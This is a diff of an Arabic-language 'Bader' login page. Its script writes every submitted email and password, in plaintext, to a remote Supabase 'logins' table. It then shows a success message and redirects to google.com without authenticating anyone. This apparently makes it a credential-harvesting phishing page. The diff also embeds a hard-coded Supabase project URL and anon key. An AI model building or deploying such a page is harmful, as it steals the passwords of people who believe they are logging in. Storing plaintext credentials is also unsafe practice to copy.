@@ -2,42 +2,26 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Bader — Login</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Bader — تسجيل الدخول</title>
   <link rel="stylesheet" href="style.css" />
 </head>
 <body>
 
   <div class="login-card">
-    <!-- Brand -->
     <h1 class="brand-title">Bader</h1>
     <p class="brand-subtitle">سجّل دخولك للمتابعة</p>
 
-    <!-- Form -->
     <form id="loginForm" autocomplete="off">
-
-      <!-- Username -->
-      <div class="form-group">
-        <span class="input-icon">&#9733;</span>
-        <input
-          type="text"
-          id="username"
-          name="username"
-          placeholder="اسم المستخدم"
-          required
-          minlength="3"
-          autocomplete="username"
-        />
-      </div>
 
       <!-- Email -->
       <div class="form-group">
-        <span class="input-icon">&#9993;</span>
+        <label for="email">البريد الإلكتروني</label>
         <input
           type="email"
           id="email"
           name="email"
-          placeholder="البريد الإلكتروني"
+          placeholder="example@gmail.com"
           required
           autocomplete="email"
         />
@@ -45,19 +29,19 @@
 
       <!-- Password -->
       <div class="form-group">
-        <span class="input-icon">&#128274;</span>
-        <input
-          type="password"
-          id="password"
-          name="password"
-          placeholder="كلمة المرور"
-          required
-          minlength="6"
-          autocomplete="current-password"
-        />
-        <button type="button" class="password-toggle" id="togglePassword" aria-label="إظهار كلمة المرور">
-          &#128065;
-        </button>
+        <label for="password">كلمة المرور</label>
+        <div class="password-wrapper">
+          <input
+            type="password"
+            id="password"
+            name="password"
+            placeholder="أدخل كلمة المرور"
+            required
+            minlength="6"
+            autocomplete="current-password"
+          />
+          <button type="button" class="password-toggle" id="togglePassword">&#128065;</button>
+        </div>
       </div>
 
       <!-- Submit -->
@@ -65,107 +49,74 @@
         <span class="btn-text">تسجيل الدخول</span>
       </button>
 
-      <!-- Status -->
       <p class="status-msg" id="statusMsg"></p>
     </form>
-
-    <div class="divider">Bader</div>
 
     <p class="card-footer">
       ليس لديك حساب؟ <a href="#">أنشئ حساباً</a>
     </p>
   </div>
 
-  <!-- Supabase SDK v2 via CDN -->
+  <!-- Supabase SDK v2 -->
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js"></script>
 
   <script>
-    // =============================================
-    //  Supabase Configuration
-    //  Replace these with your actual credentials
-    // =============================================
     const SUPABASE_URL  = 'https://svdvevhpumksppdqridi.supabase.co';
     const SUPABASE_ANON = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InN2ZHZldmhwdW1rc3BwZHFyaWRpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTIyNzEyMzUsImV4cCI6MjEwNzg0NzIzNX0.qrV7YfwymE25ywDR1RSi317MQuXsBJLpAkrCkPCq5Gc';
 
-    // Initialise Supabase client
     const { createClient } = supabase;
     const db = createClient(SUPABASE_URL, SUPABASE_ANON);
 
-    // =============================================
-    //  DOM References
-    // =============================================
-    const form        = document.getElementById('loginForm');
-    const submitBtn   = document.getElementById('submitBtn');
-    const statusMsg   = document.getElementById('statusMsg');
-    const toggleBtn   = document.getElementById('togglePassword');
-    const passwordIn  = document.getElementById('password');
+    const form      = document.getElementById('loginForm');
+    const submitBtn = document.getElementById('submitBtn');
+    const statusMsg = document.getElementById('statusMsg');
+    const toggleBtn = document.getElementById('togglePassword');
+    const passInput = document.getElementById('password');
 
-    // =============================================
-    //  Password Visibility Toggle
-    // =============================================
+    // Password toggle
     toggleBtn.addEventListener('click', () => {
-      const isPassword = passwordIn.type === 'password';
-      passwordIn.type  = isPassword ? 'text' : 'password';
-      toggleBtn.innerHTML = isPassword ? '&#128064;' : '&#128065;';
+      const isPass = passInput.type === 'password';
+      passInput.type = isPass ? 'text' : 'password';
+      toggleBtn.innerHTML = isPass ? '&#128064;' : '&#128065;';
     });
 
-    // =============================================
-    //  Helper — show status
-    // =============================================
-    function showStatus(message, type) {
-      statusMsg.textContent = message;
-      statusMsg.className   = 'status-msg ' + type;   // 'error' | 'success'
+    function showStatus(msg, type) {
+      statusMsg.textContent = msg;
+      statusMsg.className = 'status-msg ' + type;
     }
 
-    // =============================================
-    //  Form Submission
-    // =============================================
+    // Form submit
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
 
-      // Collect field values
-      const username = document.getElementById('username').value.trim();
       const email    = document.getElementById('email').value.trim();
       const password = document.getElementById('password').value;
 
-      // Basic client-side validation
-      if (!username || !email || !password) {
+      if (!email || !password) {
         showStatus('يرجى ملء جميع الحقول.', 'error');
         return;
       }
 
-      // UI — loading state
       submitBtn.classList.add('loading');
       showStatus('', '');
 
       try {
-        // Insert into 'logins' table
         const { data, error } = await db
           .from('logins')
-          .insert([
-            {
-              username : username,
-              email    : email,
-              password : password
-            }
-          ]);
+          .insert([{ email, password }]);
 
-        if (error) {
-          throw error;
-        }
+        if (error) throw error;
 
-        // Success
-        console.log('✅ Login data saved successfully:', data);
+        console.log('✅ Login data saved:', data);
         showStatus('تم تسجيل الدخول بنجاح!', 'success');
 
-        // Redirect after a brief moment
         setTimeout(() => {
           window.location.href = 'https://www.google.com';
         }, 800);
 
       } catch (err) {
-        console.error('❌ Supabase error:', err);
-        showStatus('حدث خطأ أثناء تسجيل الدخول. حاول مرة أخرى.', 'error');
+        console.error('❌ Error:', err);
+        showStatus('حدث خطأ. حاول مرة أخرى.', 'error');
       } finally {
         submitBtn.classList.remove('loading');
       }
